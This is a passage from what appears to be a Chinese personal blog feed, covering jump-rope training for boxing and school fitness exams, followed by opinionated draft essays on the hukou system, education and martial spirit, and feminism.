<h2 id="战斗体能训练：以拳击运动为例"><a href="#战斗体能训练：以拳击运动为例" class="headerlink" title="战斗体能训练：以拳击运动为例"></a>战斗体能训练：以拳击运动为例</h2><p>跳绳是拳击运动员的常规训练科目。</p>
<p>跳绳可以提高运动员小腿肌肉耐力，适应比赛中高强度的移动。提高步法的灵活性，左右交替跳绳可以使脚步更灵活，培养更好的节奏感。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JumpRope-Theme-Meiweise.png" alt=""></p>
<p>拳击运动员常用的几种步法：</p>
<ul>
<li>(1)拳击步跳</li>
</ul>
<p>除两臂外，身体各部姿势基本和拳击基本姿势相同，两脚距离前后约一步，左右约一肩，脚跟提起，脚掌着地。跳跃时两手握绳，两腕摇动.屈肘贴身，摇绳一次，两脚同时起跳一次，脚离地面不宜过高。</p>
<p>跳跃中，两脚可同时支撑体重。也可一脚或两脚交替支撑体重。一脚支撑体重时，另一脚虚点地同时起落。跳跃中还可以前、后、左、右移动位置。拳击步跳绳是拳击运动专项辅助练习的常用跳法。</p>
<p>练习时可根据训练目的，采用慢速跳、快速跳、变速跳、定次跳、定时跳等多种形式进行。</p>
<ul>
<li>(2)两脚交换跳</li>
</ul>
<p>两手正摇，当绳将要转至脚前时，先提起一脚，另一脚随即弹起跟着越绳落地.使两脚交换越绳。</p>
<ul>
<li>(3)高抬腿跳</li>
</ul>
<p>与原地高抬腿跑相似，即两足平行站立，一腿支撑体重，一腿屈膝高抬。练习时，支撑体重的腿要尽力蹬直。屈膝高抬的腿要尽力提起，一伸一屈，交替进行.上体正直.切勿后仰，这一跳法，有利腹部及大腿肌肉的增强，培养顽强的意志品质。</p>
<ul>
<li>(4)双摇跳</li>
</ul>
<p>这种跳法是脚离地一次，绳过脚两次，宜用双脚并立姿势。跳跃时要求两脚尽力蹬地，落地时两膝徽屈缓冲。以腕摇绳，注意速度和节奏。这一练习有利于腿部力量和体力、耐力的增强。</p>
<h2 id="经济社会指数：中考难度竞赛"><a href="#经济社会指数：中考难度竞赛" class="headerlink" title="经济社会指数：中考难度竞赛"></a>经济社会指数：中考难度竞赛</h2><p>跳绳运动是近年来官方推广的教学竞赛科目。由于跳绳对场地的要求极低，工具简单且能够快速上手，一直是官方背书大力推广的全民健身运动。</p>
<p>1959年，陕西师大举办了中国第一个“跳绳培训班”，开始并对跳绳运动进行系统的整理和规范，创立了跳绳运动大赛。<br>2013年，《国家学生体质健康标准》测试表正式将一分钟单摇双脚跳绳列为测试项目，小学一至六年级和初中均有该项目。</p>
<p>从近年来各地方政府公布的中考体测标准来看，跳绳在中小学生运动中的地位再被提升，甚至在部分地区矫枉过正、演变成了一种新的应试负担。随着跳绳重要程度的跃升，跳绳装备的讲究也越来越多。各类跳绳课外培训产业也应运而生，从一对一私教到多人拼团抢购，小班教学、大班带课，有些城市一节60分钟的跳绳私教课收费可达400元，这个价位已经可以跟成年人的中档健身房私教课相当。</p>
<ul>
<li>案例：南京市中考体能测试标准<br><br><img src="http://riboseyim-qiniu.riboseyim.com/PHT-%E8%B7%B3%E7%BB%B3-%E4%B8%AD%E8%80%83%E6%A0%87%E5%87%86.png" alt=""></li>
</ul>
<h4 id="一分钟跳绳"><a href="#一分钟跳绳" class="headerlink" title="一分钟跳绳"></a>一分钟跳绳</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%AD%E5%AD%A6%E4%BD%93%E8%83%BD%E6%A0%87%E5%87%86-1min%E8%B7%B3%E7%BB%B3-%E5%B9%BF%E5%B7%9E.png" alt="1分钟跳绳:广州"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%AD%E5%AD%A6%E4%BD%93%E8%83%BD%E6%A0%87%E5%87%86-1min%E8%B7%B3%E7%BB%B3.png" alt="1分钟跳绳"></p>
<h4 id="三分钟跳绳"><a href="#三分钟跳绳" class="headerlink" title="三分钟跳绳"></a>三分钟跳绳</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%AD%E5%AD%A6%E4%BD%93%E8%83%BD%E6%A0%87%E5%87%86-3min%E8%B7%B3%E7%BB%B3.png" alt="3分钟"></p>
<h2 id="思考待续"><a href="#思考待续" class="headerlink" title="思考待续"></a>思考待续</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/1800-jumprope-pinup-Sophia-Western-Theme.jpeg" alt=""></p>
<h4 id="控制论"><a href="#控制论" class="headerlink" title="控制论"></a>控制论</h4><blockquote>
<p>通信和控制系统的共同特点都包含一个信息交换的过程。<br>概念：内稳定<br>感知-&gt;控制<br>控制系统通过自己的反馈机构可以减少系统的“无组织程度”。</p>
</blockquote>
<h4 id="文化传承方式"><a href="#文化传承方式" class="headerlink" title="文化传承方式"></a>文化传承方式</h4><ul>
<li>以美国黑人社区运动歌谣为例</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JumpRope-Theme-Chinese.jpg" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JumpRope-Theme-Black.png" alt=""></p>
<h4 id="民间武德"><a href="#民间武德" class="headerlink" title="民间武德"></a>民间武德</h4><p>具有回族特点的踏脚、木球、方棋、掼牛等体育活动。</p>
<p>我国河北沧州一带武德充沛，回族群众流行一种花式跳绳活动（每年秋收罢、场院出清时流行，绳长10米至13米，直径寸余，两人各持一端，同时顺同一方向绕圈摆动，单人、双人或数人在绳子上模仿动物姿态作举、闪、滚、翻、跳跃等动作）。</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="数据图表"><a href="#数据图表" class="headerlink" title="数据图表"></a>数据图表</h4><ul>
<li><a href="https://riboseyim.com/charts/pht/index.html">运动指标</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://baike.baidu.com/tashuo/browse/content?id=a80008013a5f59d97170f336&amp;lemmaId=697143&amp;fromLemmaModule=pcBottom">比辅导作业更可怕的是，教小学生跳绳 | 作者  钟亦可|发布：2019-12-31 20:46:17</a></li>
<li><a href="http://nj.zhongkao.com/e/20130313/51405576cdfba.shtml">2013年初中毕业生升学体育考试内容及评分标准</a></li>
<li><a href="http://tj.zhongkao.com/e/20181205/5c078e2da7f06.shtml">2019年天津市中考体育跳绳满分标准</a></li>
<li><a href="https://www.thepaper.cn/newsDetail_forward_1407284">一秒跳绳7.3下！广州小学生破两项世界纪录 | 2015-12-10 16:54 来源：澎湃新闻</a></li>
<li><a href="https://www.guancha.cn/global-news/2017_05_10_407687.shtml">中国消防员集体跳绳</a></li>
<li><a href="http://guoqing.china.com.cn/zhuanti/2008-09/19/content_16507929.htm">回族的体育习俗：掼牛、驯鹰、射箭</a></li>
</ul>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>讲武堂</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测：民权法</title>
    <url>/2017/11/05/Policy-Civil-Rights/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong><br><a id="more"></a></p>
<p><strong>纳粹知道，一群特殊犯人的态度对集中营的运转会产生重要影响，这些人从事相对有特权的工作，很多都是政治犯…… 他们建造了一所妓院，并规定凭党卫队发放的入场券才能进入，这样一来，优秀的表现可以得到奖励。未来的努力也有了更大的动力。（《奥斯维辛：一部历史》p194）</strong></p>
<h2 id="Resoures"><a href="#Resoures" class="headerlink" title="Resoures"></a>Resoures</h2><ul>
<li><a href="https://www.economist.com/blogs/graphicdetail/2018/01/daily-chart-21?fsrc=scn/tw/te/bl/ed/" target="_blank" rel="noopener">Economist:Democracy continues its disturbing retreat | 2018 Chart</a></li>
</ul>
<h2 id="关于户籍制"><a href="#关于户籍制" class="headerlink" title="关于户籍制"></a>关于户籍制</h2><blockquote>
<p>一切不以尊重人权为前提、单纯经济学角度出发的改革，都是把人当牲口，妄图主宰历史潮流的肉食者谋。<br>——RiboseYim 2016</p>
</blockquote>
<h2 id="观点：户籍制实质是专制集权体制庇护下的资源分配手段"><a href="#观点：户籍制实质是专制集权体制庇护下的资源分配手段" class="headerlink" title="观点：户籍制实质是专制集权体制庇护下的资源分配手段"></a>观点：户籍制实质是专制集权体制庇护下的资源分配手段</h2><h4 id="显性"><a href="#显性" class="headerlink" title="显性"></a>显性</h4><ul>
<li>拉拢本地人口</li>
<li>歧视移民人口</li>
<li>拉拢高端人口</li>
<li>打压低端人口</li>
</ul>
<h4 id="隐性"><a href="#隐性" class="headerlink" title="隐性"></a>隐性</h4><ul>
<li>以收买本地人口之小惠、强制让渡自治权力。</li>
<li>如果取消户籍登记限制，如何应对选民登记诉求？</li>
</ul>
<h2 id="趋势：逐步瓦解，根本消失取决于政体变革。"><a href="#趋势：逐步瓦解，根本消失取决于政体变革。" class="headerlink" title="趋势：逐步瓦解，根本消失取决于政体变革。"></a>趋势：逐步瓦解，根本消失取决于政体变革。</h2><h4 id="助力因素"><a href="#助力因素" class="headerlink" title="助力因素"></a>助力因素</h4><ul>
<li>1.商业需求   </li>
<li>2.战争需求</li>
</ul>
<blockquote>
<p>12月25日，省军区接管由农建师担任的六个劳改单位的看押任务。根据兰州军区的指示，省军区决定，由省军区独立师接替原由生产建设兵团农建六师担负的5个劳改场（马栏、上畛子、槐树庄、姚家坡农场，莲花寺石碴厂）及红石岩煤矿的看押任务。同日，省政法组公安组下发《关于严格控制农村人口迁往城镇的紧急通知》。《通知》根据中央指示和公安部的紧急通知精神，要求各地对农村迁入城镇人口一定要严格控制，因招工要求报户口的，要严格审查，凡不符合规定的不给落户，并立即报告党委处理。1973年3月10日，政法组公安组又下发了《关于加强户口管理工作的通知》，要求各地坚决刹住户口管理工作中的不正之风，严格执行户口迁移政策，严格户口审批权限，严格执行《户口登记条例》。<br>—— 《陕西省公安史志》<a href="http://www.sxsdq.cn/sqzlk/dqcs/dacswz/shaanxi/sxgadsj/201706/t20170616_910081.html" target="_blank" rel="noopener">http://www.sxsdq.cn/sqzlk/dqcs/dacswz/shaanxi/sxgadsj/201706/t20170616_910081.html</a></p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwjM8Onf-NXUAhUT12MKHfVzBi8QFggnMAE&amp;url=https%3A%2F%2Fzh.wikipedia.org%2Fzh-hans%2F%25E5%25A4%25A7%25E9%25B8%25BF%25E7%25B1%25B3%25E5%25BA%2597&amp;usg=AFQjCNEYjqkbC_ADrhXhJA9ehHAlTEXJeQ" target="_blank" rel="noopener">电影：《大鸿米店》</a></li>
<li><a href="http://www.jianshu.com/p/f5f55bbe9d57" target="_blank" rel="noopener">《经济学人：自由迁徙－改革的障碍》20151219</a></li>
<li><a href="http://www.jianshu.com/p/1d920a1a6bb9" target="_blank" rel="noopener">《经济学人：外地人口管理－不要下等人》20150926</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2007/09/the_prohibition_against_multipie_dwelling_is_illegal.html" target="_blank" rel="noopener">阮一峰：禁止“群租”是否合法</a></li>
<li>[电影：《大红灯笼高高挂》]（<a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwjruO6Q-dXUAhVY0GMKHXR8CCQQFggiMAA&amp;url=https%3A%2F%2Fzh.wikipedia.org%2Fzh%2F%25E5%25A4%25A7%25E7%25BA%25A2%25E7%2581%25AF%25E7%25AC%25BC%25E9%25AB%2598%25E9%25AB%2598%25E6%258C%2582&amp;usg=AFQjCNE_yu0QExXtKuJOjM0-yzp_ku_c-Q）" target="_blank" rel="noopener">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwjruO6Q-dXUAhVY0GMKHXR8CCQQFggiMAA&amp;url=https%3A%2F%2Fzh.wikipedia.org%2Fzh%2F%25E5%25A4%25A7%25E7%25BA%25A2%25E7%2581%25AF%25E7%25AC%25BC%25E9%25AB%2598%25E9%25AB%2598%25E6%258C%2582&amp;usg=AFQjCNE_yu0QExXtKuJOjM0-yzp_ku_c-Q）</a></li>
<li><a href="http://pit.ifeng.com/a/20170710/51403294_0.shtml" target="_blank" rel="noopener">澎湃新闻网:俄罗斯的“失血”与“萎缩”</a></li>
<li><a href="https://mp.weixin.qq.com/s/hDCXnA95ArFYmE5vRWAqIg" target="_blank" rel="noopener">威权制度如何使专家变“砖家”？ | 政见CNPolitics |原创： 杨鸣宇  政见CNPolitics  1月29日</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测：教育</title>
    <url>/2016/05/15/Policy-Education/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<a id="more"></a>
<blockquote>
<p>所有做强制性控制的集权主义社会，最后都会面临挑战。对于集权主义统治者而言，基本上都是严格控制教育思想的，但最后却还是遭遇到抗争或反对声浪。因为不管是任何阶级，都需要给予基本教育才能达到国家发展的目标，基于这缘故，要给人民基本教育，让他们能有生产力；也因为给了基本教育，就无法控制他的思想，就产生很多对政府的不满意之处。<br>—— 《如何变得有思想：詹宏志谈教育、阅读和出版》</p>
<p>总有一些人，从不甘于现状，不想原地踏步，以挑战极限为己任。是他们不断拓宽着人类能力的边界，不断带领我们去往本来到不了的地方。他们清楚每次下潜都可能是最后一次，但仍随时准备出发。</p>
</blockquote>
<ul>
<li><a href="http://songshuhui.net/archives/99990" target="_blank" rel="noopener">他靠数学潜入千尺深渊，却没算中这结局</a></li>
</ul>
<p>文艺复兴人（Renaissance Man） 指多才多艺的人。</p>
<blockquote>
<p>“任何一种艺术，不管是否重要，如果你想要在该领域出类拔萃，就必须全身心投入。”<br>—— 阿尔伯蒂（Leon Battista Alberti），在建筑、文学、艺术、宗教、密码学等领域都有重大建树。</p>
</blockquote>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/QS%E4%B8%96%E7%95%8C%E5%A4%A7%E5%AD%A6%E6%8E%92%E5%90%8D" target="_blank" rel="noopener">QS排名</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E6%99%A4%E5%A3%AB%E9%AB%98%E7%AD%89%E6%95%99%E8%82%B2%E4%B8%96%E7%95%8C%E5%A4%A7%E5%AD%B8%E6%8E%92%E5%90%8D" target="_blank" rel="noopener">泰晤士排名</a></li>
<li><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%96%E7%95%8C%E5%A4%A7%E5%AD%A6%E5%AD%A6%E6%9C%AF%E6%8E%92%E5%90%8D" target="_blank" rel="noopener">上海排名</a></p>
</li>
<li><p><a href="https://www.economist.com/whichmba/full-time-mba-ranking?year=2018&amp;term_node_tid_depth=77645" target="_blank" rel="noopener">经济学人| MBA 排名</a></p>
</li>
<li><a href="https://www.economist.com/whichmba/business-school-lineup?year=" target="_blank" rel="noopener">经济学人| 商学院排名</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E9%99%A2%C2%B7%E9%99%A2%E5%A3%AB%E5%88%86%E5%B8%83%E6%83%85%E5%86%B5%C2%B7201801.png" alt="中科院院士分布情况|201801"></p>
<h4 id="（一）教育平权"><a href="#（一）教育平权" class="headerlink" title="（一）教育平权"></a>（一）教育平权</h4><p>案例：清华大学拟降分录取贫困学生、江浙地区高考指标分配争议</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/PHT-%E8%B7%B3%E7%BB%B3-%E4%B8%AD%E8%80%83%E6%A0%87%E5%87%86.png" alt></p>
<h4 id="（二）关于西式精英教育的发展和演变"><a href="#（二）关于西式精英教育的发展和演变" class="headerlink" title="（二）关于西式精英教育的发展和演变"></a>（二）关于西式精英教育的发展和演变</h4><p>关键词：绵羊、精致的利己主义者</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E7%BE%8E%E5%9B%BD%E7%9A%84%E5%A4%A7%E5%AD%A6.png" alt></p>
<h4 id="（三）是否存在中国基础教育优势？"><a href="#（三）是否存在中国基础教育优势？" class="headerlink" title="（三）是否存在中国基础教育优势？"></a>（三）是否存在中国基础教育优势？</h4><p>素材：BBC纪录片</p>
<h4 id="（四）什么是最好的教育"><a href="#（四）什么是最好的教育" class="headerlink" title="（四）什么是最好的教育"></a>（四）什么是最好的教育</h4><p>参考文章：《绵羊》西方精英教育的蜕化</p>
<h4 id="操作系统简史想到的"><a href="#操作系统简史想到的" class="headerlink" title="操作系统简史想到的"></a>操作系统简史想到的</h4><p>林纳斯·本纳第克特·托瓦兹（Linus Torvalds） ：Just for Fun (自传)<br>家族:统计学教授，在Minux上开发出来Linux 0.01</p>
<p><strong>教育平权</strong><br>时事：清华大学 拟低分录取贫困地区学生。</p>
<p>如果我是计算机教授或者技术总监，第一节课肯定会要求学生或者小弟，第一个作业就是去采购一台苹果笔记本。<br>但是教科书肯定不允许这么教，因为大多数人肯定承受不了<br>诸如此类，很多事情。</p>
<h2 id="穷文富武"><a href="#穷文富武" class="headerlink" title="穷文富武"></a>穷文富武</h2><p>尚武精神<br>才兼文武－关陇集团，人才观<br>“穷文富武”</p>
<ul>
<li><a href="https://www.zhihu.com/question/46302123" target="_blank" rel="noopener">平民如何获得军事经验</a><br>体制外：不考虑现有党国机器<br>平民：非军警，无服役经历<br>目的：有备无患，未雨绸缪</li>
</ul>
<p>军事经验范畴（仅仅是个人理解，不是很全面）：</p>
<p>1.尚武精神（且融入家庭教育、国民教育的骨髓）<br>2.一定的体能<br>3.一定的技术（类似击剑、马术、射击、格斗等）<br>4.组织系统：<br>类似美帝的童子军系统、步枪协会、各类航空&amp;射击俱乐部等等</p>
<p>参考信息：实拍美国女孩射击训练 网友：这战力不服不行</p>
<p>本题目的方向也不是说民兵代替正规国防军那种，而是类似于美帝这种思路：<br>即在和平时期，如何保持一定的战斗体能和尚武精神。<br>视频中的小姑娘也不大可能去当大兵，她这种训练肯定也是家庭教育的一部分。</p>
<p>延展开来，如果对罗马帝国的历史稍加体会的话，不难理解欧美统治精英阶层，为什么花费大量精力投入到各类体育运动项目？除了文化、社交惯性，难道就没有一点制度设计考虑？</p>
<p>松下幸之助力84岁排众议创办”政经塾”，二十几年而成日本精英的摇篮。除了学术理论，亦特别注重武士道精神的传承和训练，学员必须通过剑道和100公里以上长跑训练。在这样强悍的对手面前，我实在无法想象天朝那些大腹便便的“表哥、表叔”能有什么胜算。</p>
<p>百家争鸣时代虽有道、儒、法等门派区别，但基本上以礼、乐、射、御、书、数之六艺为基础，到汉武帝设五经博士，独尊儒，只留诗、书、礼、易、春秋，进而到后来的理学八股。礼乐、武备兵学、算学等一概不入主流，士阶层从此被培养成文弱巴结的犬儒，民风萎靡不堪，千年以降，今日亦不能自拔</p>
<h4 id="汉墓出土佩剑统计图解"><a href="#汉墓出土佩剑统计图解" class="headerlink" title="汉墓出土佩剑统计图解"></a>汉墓出土佩剑统计图解</h4><blockquote>
<p>帝国初期往往彪悍，承平日久则耽于享受，晚期天下乱起，才勉强重拾武力，可惜已是积重难返。<br>——统治精英或致力于其中者，不可不察也！</p>
</blockquote>
<p>如果佩剑数量反映的是当时社会的治安情况?<br>诸侯王公都有卫队的，真要有事老板带家伙基本没用，贵族佩剑更多是一种荣誉，反映统治阶层的价值认同取向。5月2日 12:23<br>一般社会治安的话，中晚期不可能好于早中期，流氓土匪山贼要么投军死于统一战争，要么都当官发财了，而且早期军备、保甲充实，刑法较严。中晚期以后，贵族一方面要控制日益庞大的庄园田产，一方面要对抗啸聚山林、四处冲击的流民，扩大私人武装应该是普遍的。这种就不能算一般的社会治安问题了，更接近于准战争状态。</p>
<h2 id="西方军事教育"><a href="#西方军事教育" class="headerlink" title="西方军事教育"></a>西方军事教育</h2><p>基础教育部分和国民教育序列同步对接，高强度的基层历练，必须完成远高于现有军衔要求的进修才有可能晋升，全方位的岗位轮换，再加上不可能贪污受贿享受特权……这套东西太厉害了！！<br>平时可以控制军队规模、提高技术含量，涵养高级人才，战时可以快速提拔、快速扩编。列强不愧是列强。</p>
<p><a href="http://mp.weixin.qq.com/s/Ml_vyMj-T9EBuboqu7XJAQ" target="_blank" rel="noopener">参考文章</a></p>
<p>“身无半亩心忧天下”。这是左文襄公23岁结婚之夜写的，虽有入赘之说，好歹也是州官烈士后代、世袭云骑尉好不；老师是退休的云贵总督，儿女亲家是两江总督，还未出山就可以结交魏源、林则徐……老左这个身无半亩的牛逼吹得有点大了.</p>
<h2 id="教育资源论"><a href="#教育资源论" class="headerlink" title="教育资源论"></a>教育资源论</h2><p>由于对医学和工程学等自然科学的重视，古巴经受住了1990年代苏联停止援助带来的影响。根据易货贸易协定，古巴向委内瑞拉派出了3万名医生，而委内瑞拉每天向古巴提供约10万桶石油。</p>
<h2 id="人才鉴定论"><a href="#人才鉴定论" class="headerlink" title="人才鉴定论"></a>人才鉴定论</h2><p>20160702事件<br>人格缺陷、社交功能退化</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.economist.com/special-report/2019/04/25/south-africas-youngsters-are-let-down-by-a-lousy-education-system?fsrc=scn/tw/te/bl/ed/alousyeducationsystemwastesthepotentialofsouthafricasyoungergenerationeducation" target="_blank" rel="noopener">经济学人 | South Africa’s youngsters are let down by a lousy education system</a></li>
<li><a href="https://cn.nytimes.com/education/20140610/t10harvard/dual/" target="_blank" rel="noopener">纽约时报 | 硅谷时代，斯坦福比哈佛更受青睐 </a></li>
<li><a href="http://www.moe.gov.cn/jyb_sjzl/sjzl_fztjgb/201707/t20170710_309042.html" target="_blank" rel="noopener">2016年全国教育事业发展统计公报 | 教育部，20170710</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzA1MTM0NQ==&amp;mid=400247890&amp;idx=1&amp;sn=15d5f31da103783e96907e048f1a23ba&amp;scene=1&amp;srcid=10292FMpTLVCgLw39rVcAk7v#wechat_redirect" target="_blank" rel="noopener">他带出一奥运冠军+2位世界冠军</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzA1MTM0NQ==&amp;mid=400110657&amp;idx=1&amp;sn=891ad2c68c48712bf9c558a65eb0cfa1&amp;scene=1&amp;srcid=1022xaUrLZTtgol3uXJhXMVn#rd" target="_blank" rel="noopener">体制变革经历阵痛——匈牙利击剑的“没落”之路</a></li>
<li><a href="https://mp.weixin.qq.com/s/WOlrTOUjU0srGAOMg1_ASg" target="_blank" rel="noopener">论文代写了解一下：要价63000美元的枪手论文是如何产生的？</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Education</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测：女权主义与政治运动</title>
    <url>/2017/12/09/Policy-Female/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>真假女权主义：从江青到咪蒙</li>
</ul>
<blockquote>
<p>要有勇气运用你自己的理智！，这就是启蒙运动的口号。—— 康德</p>
</blockquote>
<a id="more"></a>
<h2 id="真假女权主义：从江青到咪蒙"><a href="#真假女权主义：从江青到咪蒙" class="headerlink" title="真假女权主义：从江青到咪蒙"></a>真假女权主义：从江青到咪蒙</h2><p>最近有一个概念火了：关咪比。即微信好友中关注咪蒙的比例。</p>
<p>咪蒙号称已经突破1000万粉丝。（另据腾讯科技内部人士透露，咪蒙的公众号真实粉丝数只有500万，就姑且算作500-1000万量级吧）。现在她的广告位报价是50万元起步、普通助理月薪5万起步。</p>
<p>这位具备爆炸传播力的现象级大 V 写的都是些什么呢？其中《致贱人》一篇，在短短三日之内，文章的阅读数据超350万，最前排的评论也得到了超过2万个赞。</p>
<ul>
<li>《致贱人：我凭什么要帮你？！》</li>
<li>《致low逼：不是我太高调，而是你玻璃心》</li>
<li>《你看不上我？好巧，我也是》</li>
<li>《冒昧地问一下，你有钱回家过年吗？》</li>
<li>《识！食！物！者！为！俊！杰！》</li>
<li>《老子就是喜欢五！仁！月！饼！》</li>
</ul>
<p>光看这些标题是不是就有种酣畅淋漓的快感！在这个苦大仇深的世界，你每天被迫与贱人或Low逼周旋，这时天降咪蒙勇士，帮你上去吐了一口唾沫、把贱人、LOW逼通通打倒、再踩在两脚，之后你宛如站在道德的高地上，是否已经感觉到那种复仇的欣快感？</p>
<p>当然，有时也会变换一下套餐，呈现出“小鸟依人”的跪舔姿态，只不过这些情话充斥的是对高富帅“男神”的性幻想，绝不会考虑Low逼。我不得不说，她很能精准地拿捏人性的弱点。</p>
<ul>
<li>《我很忙，但对你永远有空》</li>
<li>《“正室要像小三一样活着”》</li>
<li>《我们的爱情，是睡出来的》</li>
<li>《她83岁还有性生活，你呢？》</li>
<li>《所谓爱你，就是一日，三餐》</li>
</ul>
<p>以咪蒙为代表的这批所谓新媒体，是一个全新的事物吗？有段时间我也一度非常迷惑，直到在野史杂记中找到一些线索：<strong>在私下里，江青经常自称老娘，叶群则一般自称姑奶奶</strong>。是不是感觉和咪蒙的语言风格很像呢？</p>
<p>咪蒙，真名马凌。本硕毕业于山东大学中文系。<br>江青，原名李云鹤。太祖武皇帝夫人。早年求学于私立青岛大学。<br>叶群，原名叶静宜。国军将门之后，毕业于北京师范大学附属中学。</p>
<p>即使以今天的标准来看，这批人都算接受过良好教育的人士，相对一般社会成员的平均教育水平来说要高的多。有意思的是，私立青岛大学即今天山东大学的前身，江青和咪蒙可以说是隔代校友了。我相信，她们也曾经是文艺清新的女青年、时代新女性的代表，怎么讲出来的话、写出来的文字更像是《水浒传》里的孙二娘呢？</p>
<blockquote>
<p>“通过一场革命或许可以实现推翻个人专制以及贪婪心和权势欲的压迫，但却决不能实现思想方式的真正变革。而新的偏见也正如镜子一样，将会成为驾驭缺少思想的广大人群的圈套。” —— 康德</p>
</blockquote>
<p>江青、叶群可以娴熟地引用马恩列斯毛的理论教条，也可以一边享受豪华奢靡的生活，同时脱口而出江湖绿林、山寨夫人的语言系统。一场革命能办得到推翻个人专制或一种压迫，但是它绝对“不能实现思想方式的政治改革”，革命不是一个人思想改造如何如何，而是一个社会怎么样。而咪蒙的火爆，也不过是说出了这个时代很多人的心声罢了。</p>
<p>专制主义对社会、对人性的腐败是全面地，不仅将男人太监化，也将女人嫔妾化。太监化的问题以后在详细讨论，可以肯定的是，宫廷太监和嫔妾二者除了在追求权力和享受方面共通之外，真实的语言系统和行为方式也同样的肤浅、丑陋和恶毒。</p>
<p>判断一个人是不是新女性（好像没有听说过新男性），不能只看她是否有光鲜靓丽的履历，也不能只看她是否打着女权主义的现代口号，而更需要分析她（他）的真实品味，特别是在私人场合的语言系统，在不设防心理状态下得真实反应。</p>
<blockquote>
<p>“到了基层就是要真刀真枪、就是要刺刀见红、就是要敢于硬碰硬、就是要解决问题。” —— 协办大学士、直隶总督兼提督九门步军巡捕五营统领·蔡</p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
